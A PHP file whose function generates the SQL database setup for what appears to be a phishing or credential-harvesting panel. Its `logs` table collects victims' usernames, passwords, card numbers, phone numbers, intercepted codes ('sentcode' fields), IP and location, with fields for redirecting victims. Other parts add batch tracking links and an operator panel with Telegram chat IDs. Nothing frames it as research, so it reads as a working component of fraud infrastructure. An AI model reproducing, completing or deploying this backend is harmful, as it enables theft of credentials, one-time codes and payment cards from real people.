<?php
  function generate_setup_sql($vars){
    $panelId="";
    $nodeName="";
    $reinstall=false;
    if(is_array($vars)){
      $panelId=$vars['panelId'];  
      $nodeName=$vars['nodeName'];  
      if(isset($vars['reinstall'])){
        $reinstall=$vars['reinstall'];  
      }
    }
    else{
        return false;
    }
    $content=<<<EOF
-- phpMyAdmin SQL Dump
-- version 5.1.0
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: May 15, 2023 at 07:25 PM
-- Server version: 10.4.18-MariaDB
-- PHP Version: 7.3.27

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `shark1111111`
--

-- --------------------------------------------------------

--
-- Table structure for table `logs`
--

CREATE TABLE `logs` (
  `SessionID` varchar(15) NOT NULL,
  `pageID` varchar(128) DEFAULT NULL,
  `Last_Online` int(20) DEFAULT NULL,
  `Status` varchar(50) DEFAULT NULL,
  `IP` varchar(45) DEFAULT NULL,
  `ISP` varchar(128) DEFAULT NULL,
  `Next_Redirect` varchar(40) DEFAULT NULL,
  `show_error` varchar(40) DEFAULT NULL,
  `Useragent` varchar(300) DEFAULT NULL,
  `sentcode` varchar(180) DEFAULT NULL,
  `sentcode2` varchar(180) DEFAULT NULL,
  `sentcode3` varchar(180) DEFAULT NULL,
  `sentcode4` varchar(180) DEFAULT NULL,
  `sentcode5` varchar(512) DEFAULT NULL,
  `phone` varchar(30) DEFAULT NULL,
  `OS` varchar(30) DEFAULT NULL,
  `country` varchar(32) DEFAULT NULL,
  `city` varchar(128) DEFAULT NULL,
  `concept` varchar(30) DEFAULT NULL,
  `region` varchar(32) DEFAULT NULL,
  `lat` varchar(32) DEFAULT NULL,
  `lon` varchar(32) DEFAULT NULL,
  `email_address` varchar(100) DEFAULT NULL,
  `username` varchar(100) DEFAULT NULL,
  `password` varchar(100) DEFAULT NULL,
  `Browser` varchar(30) DEFAULT NULL,
  `TrafficStatus` varchar(30) DEFAULT NULL,
  `ver` varchar(30) DEFAULT NULL,
  `bookmark` varchar(30) DEFAULT NULL,
  `cardnumber` varchar(32) DEFAULT NULL,
  `date_visited` datetime DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;


-- --------------------------------------------------------

--
-- Table structure for table `respons`
--

CREATE TABLE `respons` (
  `SessionID` varchar(15) DEFAULT NULL,
  `responsID` varchar(5) DEFAULT NULL,
  `respons` varchar(120) DEFAULT NULL,
  `type` varchar(30) DEFAULT NULL,
  `timestamp` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP

) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `uniquelinks`
--

CREATE TABLE `uniquelinks` (
  `number` varchar(32) COLLATE utf8_unicode_ci NOT NULL,
  `futureSessionID` varchar(5) COLLATE utf8_unicode_ci NOT NULL,
  `link` varchar(64) COLLATE utf8_unicode_ci DEFAULT NULL,
  `batchID` varchar(5) COLLATE utf8_unicode_ci NOT NULL,
  `Data 1` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Data 2` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `Data 3` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`SessionID`);

--
-- Indexes for table `respons`
--
ALTER TABLE `respons`
  ADD KEY `SessionID` (`SessionID`);

--
-- Constraints for dumped tables
--

--
-- Constraints for table `respons`
--
ALTER TABLE `respons`
  ADD CONSTRAINT `respons_ibfk_1` FOREIGN KEY (`SessionID`) REFERENCES `logs` (`SessionID`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
EOF;
  if(!$reinstall){
    $extraContent=<<<EOF
    USE $nodeName;

    INSERT INTO panels (panelID, superadmin_user, superadmin_ww, panel_name, tg_chatID1, tg_chatID2) VALUES ('$panelId', 'user', 'pass', '$panelId', 'userchatID', NULL);

    EOF;
    $content=$content.$extraContent;
  }
    return $content;
  }
?>
